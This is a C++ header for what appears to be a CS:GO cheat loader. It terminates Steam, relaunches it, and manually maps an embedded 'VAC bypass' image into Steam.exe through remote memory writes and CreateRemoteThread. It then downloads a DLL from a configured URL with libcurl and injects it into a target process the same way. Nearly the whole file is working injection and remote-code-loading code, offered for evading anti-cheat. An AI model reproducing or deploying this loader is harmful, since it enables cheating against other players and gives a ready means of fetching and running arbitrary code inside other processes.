#pragma once
#include <Windows.h>
#include <string>
#include <shellapi.h>
#include <TlHelp32.h>
#include "binary.h"
#include "config.h"

#define CURL_STATICLIB
#include <curl/curl.h>
#include <tchar.h>
#include <Shlwapi.h>
#pragma comment(lib, "libcurl_a.lib")
#pragma comment(lib, "Normaliz.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wldap32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "advapi32.lib")




using namespace std;


typedef HMODULE(__stdcall* pLoadLibraryA)(LPCSTR);
typedef FARPROC(__stdcall* pGetProcAddress)(HMODULE, LPCSTR);

typedef INT(__stdcall* dllmain)(HMODULE, DWORD, LPVOID);


struct loaderdata
{
    LPVOID ImageBase;

    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_BASE_RELOCATION BaseReloc;
    PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;

    pLoadLibraryA fnLoadLibraryA;
    pGetProcAddress fnGetProcAddress;

};

DWORD __stdcall LibraryLoader(LPVOID Memory)
{

    loaderdata* LoaderParams = (loaderdata*)Memory;

    PIMAGE_BASE_RELOCATION pIBR = LoaderParams->BaseReloc;

    DWORD delta = (DWORD)((LPBYTE)LoaderParams->ImageBase - LoaderParams->NtHeaders->OptionalHeader.ImageBase); // Calculate the delta

    while (pIBR->VirtualAddress)
    {
        if (pIBR->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
        {
            int count = (pIBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD list = (PWORD)(pIBR + 1);

            for (int i = 0; i < count; i++)
            {
                if (list[i])
                {
                    PDWORD ptr = (PDWORD)((LPBYTE)LoaderParams->ImageBase + (pIBR->VirtualAddress + (list[i] & 0xFFF)));
                    *ptr += delta;
                }
            }
        }

        pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR + pIBR->SizeOfBlock);
    }

    PIMAGE_IMPORT_DESCRIPTOR pIID = LoaderParams->ImportDirectory;

    // Resolve DLL imports
    while (pIID->Characteristics)
    {
        PIMAGE_THUNK_DATA OrigFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)LoaderParams->ImageBase + pIID->OriginalFirstThunk);
        PIMAGE_THUNK_DATA FirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)LoaderParams->ImageBase + pIID->FirstThunk);

        HMODULE hModule = LoaderParams->fnLoadLibraryA((LPCSTR)LoaderParams->ImageBase + pIID->Name);

        if (!hModule)
            return FALSE;

        while (OrigFirstThunk->u1.AddressOfData)
        {
            if (OrigFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
            {
                // Import by ordinal
                DWORD Function = (DWORD)LoaderParams->fnGetProcAddress(hModule,
                    (LPCSTR)(OrigFirstThunk->u1.Ordinal & 0xFFFF));

                if (!Function)
                    return FALSE;

                FirstThunk->u1.Function = Function;
            }
            else
            {
                // Import by name
                PIMAGE_IMPORT_BY_NAME pIBN = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)LoaderParams->ImageBase + OrigFirstThunk->u1.AddressOfData);
                DWORD Function = (DWORD)LoaderParams->fnGetProcAddress(hModule, (LPCSTR)pIBN->Name);
                if (!Function)
                    return FALSE;

                FirstThunk->u1.Function = Function;
            }
            OrigFirstThunk++;
            FirstThunk++;
        }
        pIID++;
    }

    if (LoaderParams->NtHeaders->OptionalHeader.AddressOfEntryPoint)
    {
        dllmain EntryPoint = (dllmain)((LPBYTE)LoaderParams->ImageBase + LoaderParams->NtHeaders->OptionalHeader.AddressOfEntryPoint);

        return EntryPoint((HMODULE)LoaderParams->ImageBase, DLL_PROCESS_ATTACH, NULL); // Call the entry point
    }
    return TRUE;
}


typedef struct {
    PBYTE baseAddress;
    HMODULE(WINAPI* loadLibraryA)(PCSTR);
    FARPROC(WINAPI* getProcAddress)(HMODULE, PCSTR);
    VOID(WINAPI* rtlZeroMemory)(PVOID, SIZE_T);

    DWORD imageBase;
    DWORD relocVirtualAddress;
    DWORD importVirtualAddress;
    DWORD addressOfEntryPoint;
} LoaderData;

VOID waitOnModule(DWORD processId, PCWSTR moduleName)
{
    BOOL foundModule = FALSE;

    while (!foundModule) {
        HANDLE moduleSnapshot = INVALID_HANDLE_VALUE;

        while (moduleSnapshot == INVALID_HANDLE_VALUE)
            moduleSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processId);

        MODULEENTRY32W moduleEntry;
        moduleEntry.dwSize = sizeof(moduleEntry);

        if (Module32FirstW(moduleSnapshot, &moduleEntry)) {
            do {
                if (!lstrcmpiW(moduleEntry.szModule, moduleName)) {
                    foundModule = TRUE;
                    break;
                }
            } while (Module32NextW(moduleSnapshot, &moduleEntry));
        }
        CloseHandle(moduleSnapshot);
    }
}

VOID killAnySteamProcess()
{
    //authra yenı klavye al pwardon authra pc yenı ayar tmm
    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W processEntry;
    processEntry.dwSize = sizeof(processEntry);

    if (Process32FirstW(processSnapshot, &processEntry)) {
        PCWSTR steamProcesses[] = { (L"Steam.exe"), (L"SteamService.exe"), (L"steamwebhelper.exe") };
        do {
            for (INT i = 0; i < _countof(steamProcesses); i++) {
                if (!lstrcmpiW(processEntry.szExeFile, steamProcesses[i])) {
                    HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
                    if (processHandle) {
                        TerminateProcess(processHandle, 0);
                        CloseHandle(processHandle);
                    }
                }
            }
        } while (Process32NextW(processSnapshot, &processEntry));
    }
    CloseHandle(processSnapshot);
}

bool IsProcessRunning(const TCHAR* const executableName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    const auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (!Process32First(snapshot, &entry)) {
        CloseHandle(snapshot);
        return false;
    }

    do {
        if (!_tcsicmp(entry.szExeFile, executableName)) {
            CloseHandle(snapshot);
            return true;
        }
    } while (Process32Next(snapshot, &entry));

    CloseHandle(snapshot);
    return false;
}
bool isRunning(LPCSTR pName)
{
    HWND hwnd;
    hwnd = FindWindow(NULL, pName);
    if (hwnd != 0) {
        return true;
    }
    else {
        return false;
    }
}

DWORD __stdcall stub()
{
    return 0;
}


int startbypass()
{
    try {
        HKEY key = NULL;
        if (!RegOpenKeyExW(HKEY_CURRENT_USER, (L"Software\\Valve\\Steam"), 0, KEY_QUERY_VALUE, &key)) {
            WCHAR steamPath[MAX_PATH];
            steamPath[0] = L'"';
            DWORD steamPathSize = sizeof(steamPath) - sizeof(WCHAR);

            if (!RegQueryValueExW(key, (L"SteamExe"), NULL, NULL, (LPBYTE)(steamPath + 1), &steamPathSize)) {
                lstrcatW(steamPath, (L"\""));
                lstrcatW(steamPath, PathGetArgsW(GetCommandLineW()));

                killAnySteamProcess();

                STARTUPINFOW info = { sizeof(info) };
                PROCESS_INFORMATION processInfo;

                if (CreateProcessW(NULL, steamPath, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo)) {
                    waitOnModule(processInfo.dwProcessId, (L"Steam.exe"));
                    SuspendThread(processInfo.hThread);

                    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(binary + ((PIMAGE_DOS_HEADER)binary)->e_lfanew);

                    PBYTE executableImage = (PBYTE)VirtualAllocEx(processInfo.hProcess, NULL, ntHeaders->OptionalHeader.SizeOfImage,
                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                    PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER)(ntHeaders + 1);
                    for (INT i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
                        WriteProcessMemory(processInfo.hProcess, executableImage + sectionHeaders[i].VirtualAddress,
                            binary + sectionHeaders[i].PointerToRawData, sectionHeaders[i].SizeOfRawData, NULL);

                    LoaderData* loaderMemory = (LoaderData*)VirtualAllocEx(processInfo.hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE,
                        PAGE_EXECUTE_READ);

                    LoaderData loaderParams;
                    loaderParams.baseAddress = executableImage;
                    loaderParams.loadLibraryA = LoadLibraryA;
                    loaderParams.getProcAddress = GetProcAddress;
                    VOID(NTAPI RtlZeroMemory)(VOID * Destination, SIZE_T Length);
                    loaderParams.imageBase = ntHeaders->OptionalHeader.ImageBase;
                    loaderParams.relocVirtualAddress = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
                    loaderParams.importVirtualAddress = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
                    loaderParams.addressOfEntryPoint = ntHeaders->OptionalHeader.AddressOfEntryPoint;

                    WriteProcessMemory(processInfo.hProcess, loaderMemory, &loaderParams, sizeof(LoaderData),
                        NULL);
                    WriteProcessMemory(processInfo.hProcess, loaderMemory + 1, LibraryLoader,
                        (DWORD)stub - (DWORD)LibraryLoader, NULL);
                    HANDLE thread = CreateRemoteThread(processInfo.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(loaderMemory + 1),
                        loaderMemory, 0, NULL);

                    ResumeThread(processInfo.hThread);
                    WaitForSingleObject(thread, INFINITE);
                    VirtualFreeEx(processInfo.hProcess, loaderMemory, 0, MEM_RELEASE);

                    CloseHandle(processInfo.hProcess);
                    CloseHandle(processInfo.hThread);
                }
            }
            RegCloseKey(key);
        }
    }
    catch (exception ex) {
        printf("[-] Vac Bypass Failed");
    }
    printf("[+] Vac Bypass Succeed.. wait few seconds");
    ShellExecute(0, 0, ("steam://rungameid/730"), 0, 0, SW_HIDE);
    while (true)
    {
        if (FindWindowA(NULL, ("Counter-Strike: Global Offensive"))) {
            break;
        }
    }
    return 1;
}



struct memory {
    char* response;
    size_t size;
};
static size_t cb(void* data, size_t size, size_t nmemb, void* userp)
{
    size_t realsize = size * nmemb;
    struct memory* mem = (struct memory*)userp;

    void* ptr = realloc(mem->response, mem->size + realsize + 1);
    if (ptr == NULL)
        return 0; 

    mem->response = (char*)ptr;
    memcpy(&(mem->response[mem->size]), data, realsize);
    mem->size += realsize;
    mem->response[mem->size] = 0;
    return realsize;
}

DWORD FindProcessId(string processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    Process32First(processSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        CloseHandle(processSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            CloseHandle(processSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processSnapshot);
    return 0;
}

struct memory chunk;
bool initialize(DWORD ProcessId)
{

    CURL* curl_handle;
    curl_global_init(CURL_GLOBAL_ALL);
    curl_handle = curl_easy_init();
    curl_easy_setopt(curl_handle, CURLOPT_URL, DLL_URL);
    curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
    curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, cb);
    curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, (void*)&chunk);
    curl_easy_perform(curl_handle);
    DWORD FileSize = chunk.size;
    PVOID FileBuffer = chunk.response;
    ReadFile(curl_handle, FileBuffer, FileSize, NULL, NULL);

    loaderdata LoaderParams;
    //	ReadFile(urlFile, FileBuffer, FileSize, NULL, NULL);
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)FileBuffer;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileBuffer + pDosHeader->e_lfanew);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
    PVOID ExecutableImage = VirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, ExecutableImage, FileBuffer,
        pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
    PIMAGE_SECTION_HEADER pSectHeader = (PIMAGE_SECTION_HEADER)(pNtHeaders + 1);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        WriteProcessMemory(hProcess, (PVOID)((LPBYTE)ExecutableImage + pSectHeader[i].VirtualAddress),
            (PVOID)((LPBYTE)FileBuffer + pSectHeader[i].PointerToRawData), pSectHeader[i].SizeOfRawData, NULL);
    }
    PVOID LoaderMemory = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    LoaderParams.ImageBase = ExecutableImage;
    LoaderParams.NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)ExecutableImage + pDosHeader->e_lfanew);
    LoaderParams.BaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)ExecutableImage
        + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    LoaderParams.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)ExecutableImage
        + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    LoaderParams.fnLoadLibraryA = LoadLibraryA;
    LoaderParams.fnGetProcAddress = GetProcAddress;
    WriteProcessMemory(hProcess, LoaderMemory, &LoaderParams, sizeof(loaderdata),
        NULL);
    WriteProcessMemory(hProcess, (PVOID)((loaderdata*)LoaderMemory + 1), LibraryLoader,
        (DWORD)stub - (DWORD)LibraryLoader, NULL);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((loaderdata*)LoaderMemory + 1),
        LoaderMemory, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, LoaderMemory, 0, MEM_RELEASE);
    return 1;
}
